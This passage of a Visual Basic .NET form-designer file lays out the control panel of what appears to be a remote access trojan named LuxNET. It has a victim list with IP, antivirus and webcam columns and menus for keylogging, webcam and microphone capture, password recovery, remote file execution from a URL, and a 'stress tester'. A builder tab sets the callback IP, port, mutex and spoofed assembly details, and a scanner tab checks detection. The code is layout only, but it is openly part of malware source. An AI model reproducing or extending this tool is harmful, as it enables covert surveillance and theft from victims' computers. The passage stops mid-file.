<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class FormMain
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(FormMain))
        Dim ListViewItem1 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem(New String() {"4431", "Idle"}, -1)
        Me.StatusBar1 = New System.Windows.Forms.StatusStrip()
        Me.StatusBarMain = New System.Windows.Forms.ToolStripStatusLabel()
        Me.LVCH_Location = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVCH_IP = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVCH_Port = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVCH_ClientID = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVCH_UserName = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVCH_ComputerName = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVCH_OS = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVCH_OsVersion = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVCH_AV = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVCH_Privilegs = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVCH_Webcam = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVCH_Ping = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.CM_Clients = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.GroupByToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LocationToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ClientIDToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OperatingSystemToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AntiVirusToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PrivilegsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem1 = New System.Windows.Forms.ToolStripSeparator()
        Me.FileManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SystemManagersToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RegistryManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SurveillanceToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DesktopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ScreenshotToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.WebcamToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.KeyloggerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MicrophoneToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PasswordRecoveryToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem2 = New System.Windows.Forms.ToolStripSeparator()
        Me.ServerOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateServerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ExecuteFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromFileToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.PingToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DisconnectToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MiscelleanousToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ScriptingToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ChatToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MessageBoxToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.InputBoxToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TrollFunFunctionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AdminToolsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem3 = New System.Windows.Forms.ToolStripSeparator()
        Me.StressTesterToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MapViewToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TorrentSeederToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LVC_Time = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.LVC_Log = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.CMS_Logs = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ClearToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BetterListViewColumnHeader5 = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.BetterListViewColumnHeader6 = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.BetterListViewColumnHeader7 = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.BetterListViewColumnHeader3 = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.BetterListViewColumnHeader4 = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.BetterListViewColumnHeader1 = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.BetterListViewColumnHeader2 = New ComponentOwl.BetterListView.BetterListViewColumnHeader()
        Me.IL_TabControl = New System.Windows.Forms.ImageList(Me.components)
        Me.IL_OnConnect = New System.Windows.Forms.ImageList(Me.components)
        Me.CMS_OnConnect = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RemoveToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.ImageListView11 = New Manina.Windows.Forms.ImageListView()
        Me.IL_CountryFlags = New System.Windows.Forms.ImageList(Me.components)
        Me.Tabcontrol1 = New LuxNET.CustomTabcontrol()
        Me.LV_Clientdds = New System.Windows.Forms.TabPage()
        Me.LV_Clients = New ComponentOwl.BetterListView.BetterListView()
        Me.TP_Settings = New System.Windows.Forms.TabPage()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.LV_Ports = New System.Windows.Forms.ListView()
        Me.CH_Port = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.CH_Status = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.cb_sound = New System.Windows.Forms.CheckBox()
        Me.cb_notify = New System.Windows.Forms.CheckBox()
        Me.cb_autolisten = New System.Windows.Forms.CheckBox()
        Me.btn_stoplistening = New System.Windows.Forms.Button()
        Me.btn_startlistening = New System.Windows.Forms.Button()
        Me.TC_Builder = New System.Windows.Forms.TabPage()
        Me.TabControl12222 = New System.Windows.Forms.TabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.GroupBox4 = New System.Windows.Forms.GroupBox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.NumericUpDown1 = New System.Windows.Forms.NumericUpDown()
        Me.CheckBox7 = New System.Windows.Forms.CheckBox()
        Me.CheckBox5 = New System.Windows.Forms.CheckBox()
        Me.CheckBox3 = New System.Windows.Forms.CheckBox()
        Me.CheckBox6 = New System.Windows.Forms.CheckBox()
        Me.TextBox3 = New System.Windows.Forms.TextBox()
        Me.CheckBox2 = New System.Windows.Forms.CheckBox()
        Me.TextBox2 = New System.Windows.Forms.TextBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.RadioButton3 = New System.Windows.Forms.RadioButton()
        Me.RadioButton2 = New System.Windows.Forms.RadioButton()
        Me.RadioButton1 = New System.Windows.Forms.RadioButton()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.RandomPool1 = New LuxNET.RandomPool()
        Me.TB_Mutex = New System.Windows.Forms.TextBox()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.tb_clientid = New System.Windows.Forms.TextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.nud_port = New System.Windows.Forms.NumericUpDown()
        Me.tb_ip = New System.Windows.Forms.TextBox()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.LinkLabel1 = New System.Windows.Forms.LinkLabel()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.CheckBox8 = New System.Windows.Forms.CheckBox()
        Me.GroupBox7 = New System.Windows.Forms.GroupBox()
        Me.rtb_output = New System.Windows.Forms.RichTextBox()
        Me.GroupBox6 = New System.Windows.Forms.GroupBox()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.GroupBox5 = New System.Windows.Forms.GroupBox()
        Me.NumericUpDown8 = New System.Windows.Forms.NumericUpDown()
        Me.NumericUpDown7 = New System.Windows.Forms.NumericUpDown()
        Me.NumericUpDown6 = New System.Windows.Forms.NumericUpDown()
        Me.NumericUpDown5 = New System.Windows.Forms.NumericUpDown()
        Me.Label13 = New System.Windows.Forms.Label()
        Me.NumericUpDown4 = New System.Windows.Forms.NumericUpDown()
        Me.NumericUpDown3 = New System.Windows.Forms.NumericUpDown()
        Me.NumericUpDown2 = New System.Windows.Forms.NumericUpDown()
        Me.NumericUpDown9 = New System.Windows.Forms.NumericUpDown()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.tb_assemblytrademark = New System.Windows.Forms.TextBox()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.tb_assemblycopyright = New System.Windows.Forms.TextBox()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.tb_assemblyproduct = New System.Windows.Forms.TextBox()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.tb_assemblycompany = New System.Windows.Forms.TextBox()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.tb_assemblydescription = New System.Windows.Forms.TextBox()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.tb_assemblytitle = New System.Windows.Forms.TextBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.TP_Logs = New System.Windows.Forms.TabPage()
        Me.LV_Logs = New ComponentOwl.BetterListView.BetterListView()
        Me.TP_OnConnect = New System.Windows.Forms.TabPage()
        Me.Label15 = New System.Windows.Forms.Label()
        Me.ComboBox3 = New System.Windows.Forms.ComboBox()
        Me.ComboBox2 = New System.Windows.Forms.ComboBox()
        Me.Label14 = New System.Windows.Forms.Label()
        Me.ComboBox1 = New System.Windows.Forms.ComboBox()
        Me.LV_OnConnect = New ComponentOwl.BetterListView.BetterListView()
        Me.TP_Thumbnail = New System.Windows.Forms.TabPage()
        Me.Panel2 = New System.Windows.Forms.Panel()
        Me.ImageListView1 = New Manina.Windows.Forms.ImageListView()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.Button_Thumbnail = New System.Windows.Forms.PictureBox()
        Me.CB_Thumbnail_Webcam = New System.Windows.Forms.CheckBox()
        Me.CB_Thumbnail_Desktop = New System.Windows.Forms.CheckBox()
        Me.TC_Other = New System.Windows.Forms.TabPage()
        Me.TabControl222 = New System.Windows.Forms.TabControl()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.rtb_news = New System.Windows.Forms.RichTextBox()
        Me.LV_News = New ComponentOwl.BetterListView.BetterListView()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.Label_TOS = New System.Windows.Forms.Label()
        Me.TC_Statistics = New System.Windows.Forms.TabPage()
        Me.TabControl32222 = New System.Windows.Forms.TabControl()
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.Graph_Sent = New LuxNET.Graph()
        Me.Label16 = New System.Windows.Forms.Label()
        Me.TabPage6 = New System.Windows.Forms.TabPage()
        Me.Graph_Receive = New LuxNET.Graph()
        Me.Label17 = New System.Windows.Forms.Label()
        Me.TabPage9 = New System.Windows.Forms.TabPage()
        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar()
        Me.btn_scan = New System.Windows.Forms.Button()
        Me.Label_Detection = New System.Windows.Forms.Label()
        Me.LV_Scanner = New ComponentOwl.BetterListView.BetterListView()
        Me.TabPage10 = New System.Windows.Forms.TabPage()
        Me.GroupBox11 = New System.Windows.Forms.GroupBox()
        Me.Label26 = New System.Windows.Forms.Label()
        Me.Button10 = New System.Windows.Forms.Button()
        Me.Button9 = New System.Windows.Forms.Button()
        Me.TextBox8 = New System.Windows.Forms.TextBox()
        Me.Label25 = New System.Windows.Forms.Label()
        Me.Button8 = New System.Windows.Forms.Button()
        Me.TextBox7 = New System.Windows.Forms.TextBox()
        Me.Label24 = New System.Windows.Forms.Label()
        Me.GroupBox10 = New System.Windows.Forms.GroupBox()
        Me.Button7 = New System.Windows.Forms.Button()
        Me.ComboBox4 = New System.Windows.Forms.ComboBox()
        Me.Label23 = New System.Windows.Forms.Label()
        Me.Button6 = New System.Windows.Forms.Button()
        Me.TextBox6 = New System.Windows.Forms.TextBox()
        Me.Label22 = New System.Windows.Forms.Label()
        Me.GroupBox9 = New System.Windows.Forms.GroupBox()
        Me.Button2 = New System.Windows.Forms.Button()
        Me.Button3 = New System.Windows.Forms.Button()
        Me.RadioButton6 = New System.Windows.Forms.RadioButton()
        Me.RadioButton5 = New System.Windows.Forms.RadioButton()
        Me.Label21 = New System.Windows.Forms.Label()
        Me.NumericUpDown10 = New System.Windows.Forms.NumericUpDown()
        Me.RadioButton4 = New System.Windows.Forms.RadioButton()
        Me.Label20 = New System.Windows.Forms.Label()
        Me.TextBox4 = New System.Windows.Forms.TextBox()
        Me.Label19 = New System.Windows.Forms.Label()
        Me.GroupBox8 = New System.Windows.Forms.GroupBox()
        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
        Me.Button4 = New System.Windows.Forms.Button()
        Me.Button5 = New System.Windows.Forms.Button()
        Me.TextBox5 = New System.Windows.Forms.TextBox()
        Me.Label18 = New System.Windows.Forms.Label()
        Me.StatusBar1.SuspendLayout()
        Me.CM_Clients.SuspendLayout()
        Me.CMS_Logs.SuspendLayout()
        Me.CMS_OnConnect.SuspendLayout()
        Me.Tabcontrol1.SuspendLayout()
        Me.LV_Clientdds.SuspendLayout()
        CType(Me.LV_Clients, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TP_Settings.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        Me.TC_Builder.SuspendLayout()
        Me.TabControl12222.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.GroupBox4.SuspendLayout()
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox3.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        CType(Me.nud_port, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage2.SuspendLayout()
        Me.GroupBox7.SuspendLayout()
        Me.GroupBox6.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox5.SuspendLayout()
        CType(Me.NumericUpDown8, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NumericUpDown7, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NumericUpDown6, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NumericUpDown5, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NumericUpDown4, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NumericUpDown3, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NumericUpDown2, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NumericUpDown9, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TP_Logs.SuspendLayout()
        CType(Me.LV_Logs, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TP_OnConnect.SuspendLayout()
        CType(Me.LV_OnConnect, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TP_Thumbnail.SuspendLayout()
        Me.Panel2.SuspendLayout()
        Me.Panel1.SuspendLayout()
        CType(Me.Button_Thumbnail, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TC_Other.SuspendLayout()
        Me.TabControl222.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        CType(Me.LV_News, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage4.SuspendLayout()
        Me.TC_Statistics.SuspendLayout()
        Me.TabControl32222.SuspendLayout()
        Me.TabPage5.SuspendLayout()
        Me.TabPage6.SuspendLayout()
        Me.TabPage9.SuspendLayout()
        CType(Me.LV_Scanner, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage10.SuspendLayout()
        Me.GroupBox11.SuspendLayout()
        Me.GroupBox10.SuspendLayout()
        Me.GroupBox9.SuspendLayout()
        CType(Me.NumericUpDown10, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox8.SuspendLayout()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'StatusBar1
        '
        Me.StatusBar1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StatusBarMain})
        Me.StatusBar1.Location = New System.Drawing.Point(0, 434)
        Me.StatusBar1.Name = "StatusBar1"
        Me.StatusBar1.Size = New System.Drawing.Size(1031, 22)
        Me.StatusBar1.TabIndex = 0
        Me.StatusBar1.Text = "StatusStrip1"
        '
        'StatusBarMain
        '
        Me.StatusBarMain.Name = "StatusBarMain"
        Me.StatusBarMain.Size = New System.Drawing.Size(26, 17)
        Me.StatusBarMain.Text = "Idle"
        '
        'LVCH_Location
        '
        Me.LVCH_Location.Name = "LVCH_Location"
        Me.LVCH_Location.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_Location.Text = "Location"
        Me.LVCH_Location.Width = 85
        '
        'LVCH_IP
        '
        Me.LVCH_IP.Name = "LVCH_IP"
        Me.LVCH_IP.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_IP.Text = "Public IP-Address"
        Me.LVCH_IP.Width = 114
        '
        'LVCH_Port
        '
        Me.LVCH_Port.Name = "LVCH_Port"
        Me.LVCH_Port.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_Port.Text = "Port"
        Me.LVCH_Port.Width = 50
        '
        'LVCH_ClientID
        '
        Me.LVCH_ClientID.Name = "LVCH_ClientID"
        Me.LVCH_ClientID.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_ClientID.Text = "Client ID"
        Me.LVCH_ClientID.Width = 93
        '
        'LVCH_UserName
        '
        Me.LVCH_UserName.Name = "LVCH_UserName"
        Me.LVCH_UserName.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_UserName.Text = "UserName"
        '
        'LVCH_ComputerName
        '
        Me.LVCH_ComputerName.Name = "LVCH_ComputerName"
        Me.LVCH_ComputerName.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_ComputerName.Text = "Computer Name"
        '
        'LVCH_OS
        '
        Me.LVCH_OS.Name = "LVCH_OS"
        Me.LVCH_OS.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_OS.Text = "Operating System"
        Me.LVCH_OS.Width = 161
        '
        'LVCH_OsVersion
        '
        Me.LVCH_OsVersion.Name = "LVCH_OsVersion"
        Me.LVCH_OsVersion.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_OsVersion.Text = "Os Version"
        Me.LVCH_OsVersion.Width = 109
        '
        'LVCH_AV
        '
        Me.LVCH_AV.Name = "LVCH_AV"
        Me.LVCH_AV.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_AV.Text = "AntiVirus"
        '
        'LVCH_Privilegs
        '
        Me.LVCH_Privilegs.Name = "LVCH_Privilegs"
        Me.LVCH_Privilegs.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_Privilegs.Text = "Privilegs"
        Me.LVCH_Privilegs.Width = 71
        '
        'LVCH_Webcam
        '
        Me.LVCH_Webcam.Name = "LVCH_Webcam"
        Me.LVCH_Webcam.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_Webcam.Text = "Webcam"
        Me.LVCH_Webcam.Width = 59
        '
        'LVCH_Ping
        '
        Me.LVCH_Ping.Name = "LVCH_Ping"
        Me.LVCH_Ping.Style = ComponentOwl.BetterListView.BetterListViewColumnHeaderStyle.Sortable
        Me.LVCH_Ping.Text = "Ping"
        Me.LVCH_Ping.Width = 54
        '
        'CM_Clients
        '
        Me.CM_Clients.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.GroupByToolStripMenuItem, Me.ToolStripMenuItem1, Me.FileManagerToolStripMenuItem, Me.SystemManagersToolStripMenuItem, Me.RegistryManagerToolStripMenuItem, Me.SurveillanceToolStripMenuItem, Me.ToolStripMenuItem2, Me.ServerOptionsToolStripMenuItem, Me.MiscelleanousToolStripMenuItem, Me.AdminToolsToolStripMenuItem, Me.ToolStripMenuItem3, Me.StressTesterToolStripMenuItem, Me.MapViewToolStripMenuItem, Me.TorrentSeederToolStripMenuItem})
        Me.CM_Clients.Name = "CM_Clients"
        Me.CM_Clients.Size = New System.Drawing.Size(168, 264)
        '
        'GroupByToolStripMenuItem
        '
        Me.GroupByToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LocationToolStripMenuItem, Me.ClientIDToolStripMenuItem, Me.OperatingSystemToolStripMenuItem, Me.AntiVirusToolStripMenuItem, Me.PrivilegsToolStripMenuItem})
        Me.GroupByToolStripMenuItem.Image = CType(resources.GetObject("GroupByToolStripMenuItem.Image"), System.Drawing.Image)
        Me.GroupByToolStripMenuItem.Name = "GroupByToolStripMenuItem"
        Me.GroupByToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.GroupByToolStripMenuItem.Text = "Group by"
        '
        'LocationToolStripMenuItem
        '
        Me.LocationToolStripMenuItem.Image = CType(resources.GetObject("LocationToolStripMenuItem.Image"), System.Drawing.Image)
        Me.LocationToolStripMenuItem.Name = "LocationToolStripMenuItem"
        Me.LocationToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.LocationToolStripMenuItem.Text = "Location"
        '
        'ClientIDToolStripMenuItem
        '
        Me.ClientIDToolStripMenuItem.Image = CType(resources.GetObject("ClientIDToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ClientIDToolStripMenuItem.Name = "ClientIDToolStripMenuItem"
        Me.ClientIDToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.ClientIDToolStripMenuItem.Text = "Client ID"
        '
        'OperatingSystemToolStripMenuItem
        '
        Me.OperatingSystemToolStripMenuItem.Image = CType(resources.GetObject("OperatingSystemToolStripMenuItem.Image"), System.Drawing.Image)
        Me.OperatingSystemToolStripMenuItem.Name = "OperatingSystemToolStripMenuItem"
        Me.OperatingSystemToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.OperatingSystemToolStripMenuItem.Text = "Operating System"
        '
        'AntiVirusToolStripMenuItem
        '
        Me.AntiVirusToolStripMenuItem.Image = CType(resources.GetObject("AntiVirusToolStripMenuItem.Image"), System.Drawing.Image)
        Me.AntiVirusToolStripMenuItem.Name = "AntiVirusToolStripMenuItem"
        Me.AntiVirusToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.AntiVirusToolStripMenuItem.Text = "AntiVirus"
        '
        'PrivilegsToolStripMenuItem
        '
        Me.PrivilegsToolStripMenuItem.Image = CType(resources.GetObject("PrivilegsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PrivilegsToolStripMenuItem.Name = "PrivilegsToolStripMenuItem"
        Me.PrivilegsToolStripMenuItem.Size = New System.Drawing.Size(168, 22)
        Me.PrivilegsToolStripMenuItem.Text = "Privilegs"
        '
        'ToolStripMenuItem1
        '
        Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
        Me.ToolStripMenuItem1.Size = New System.Drawing.Size(164, 6)
        '
        'FileManagerToolStripMenuItem
        '
        Me.FileManagerToolStripMenuItem.Image = CType(resources.GetObject("FileManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FileManagerToolStripMenuItem.Name = "FileManagerToolStripMenuItem"
        Me.FileManagerToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.FileManagerToolStripMenuItem.Text = "File Manager"
        '
        'SystemManagersToolStripMenuItem
        '
        Me.SystemManagersToolStripMenuItem.Image = CType(resources.GetObject("SystemManagersToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SystemManagersToolStripMenuItem.Name = "SystemManagersToolStripMenuItem"
        Me.SystemManagersToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.SystemManagersToolStripMenuItem.Text = "System Managers"
        '
        'RegistryManagerToolStripMenuItem
        '
        Me.RegistryManagerToolStripMenuItem.Image = CType(resources.GetObject("RegistryManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RegistryManagerToolStripMenuItem.Name = "RegistryManagerToolStripMenuItem"
        Me.RegistryManagerToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.RegistryManagerToolStripMenuItem.Text = "Registry Manager"
        '
        'SurveillanceToolStripMenuItem
        '
        Me.SurveillanceToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DesktopToolStripMenuItem, Me.ScreenshotToolStripMenuItem, Me.WebcamToolStripMenuItem, Me.KeyloggerToolStripMenuItem, Me.MicrophoneToolStripMenuItem, Me.PasswordRecoveryToolStripMenuItem})
        Me.SurveillanceToolStripMenuItem.Image = CType(resources.GetObject("SurveillanceToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SurveillanceToolStripMenuItem.Name = "SurveillanceToolStripMenuItem"
        Me.SurveillanceToolStripMenuItem.Size = New System.Drawing.Size(167, 22)
        Me.SurveillanceToolStripMenuItem.Text = "Surveillance"
        '
        'DesktopToolStripMenuItem
        '
        Me.DesktopToolStripMenuItem.Image = CType(resources.GetObject("DesktopToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DesktopToolStripMenuItem.Name = "DesktopToolStripMenuItem"
        Me.DesktopToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.DesktopToolStripMenuItem.Text = "Desktop"
        '
        'ScreenshotToolStripMenuItem
        '
        Me.ScreenshotToolStripMenuItem.Image = CType(resources.GetObject("ScreenshotToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ScreenshotToolStripMenuItem.Name = "ScreenshotToolStripMenuItem"
        Me.ScreenshotToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.ScreenshotToolStripMenuItem.Text = "Screenshot"
        '
        'WebcamToolStripMenuItem
        '
        Me.WebcamToolStripMenuItem.Image = CType(resources.GetObject("WebcamToolStripMenuItem.Image"), System.Drawing.Image)
        Me.WebcamToolStripMenuItem.Name = "WebcamToolStripMenuItem"
        Me.WebcamToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.WebcamToolStripMenuItem.Text = "Webcam"
        '
        'KeyloggerToolStripMenuItem
        '
        Me.KeyloggerToolStripMenuItem.Image = CType(resources.GetObject("KeyloggerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.KeyloggerToolStripMenuItem.Name = "KeyloggerToolStripMenuItem"
        Me.KeyloggerToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.KeyloggerToolStripMenuItem.Text = "Keylogger"
        '
        'MicrophoneToolStripMenuItem
        '
        Me.MicrophoneToolStripMenuItem.Image = CType(resources.GetObject("MicrophoneToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MicrophoneToolStripMenuItem.Name = "MicrophoneToolStripMenuItem"
        Me.MicrophoneToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.MicrophoneToolStripMenuItem.Text = "Microphone"
        '
        'PasswordRecoveryToolStripMenuItem
        '
        Me.PasswordRecoveryToolStripMenuItem.Image = CType(resources.GetObject("PasswordRecoveryToolStripMenuItem.Image"), System.Drawing.Image)
        Me.PasswordRecoveryToolStripMenuItem.Name = "PasswordRecoveryToolStripMenuItem"
        Me.PasswordRecoveryToolStripMenuItem.Size = New System.Drawing.Size(175, 22)
        Me.PasswordRecoveryToolStripMenuItem.Text = "Password Recovery"
        '
        'ToolStripMenuItem2
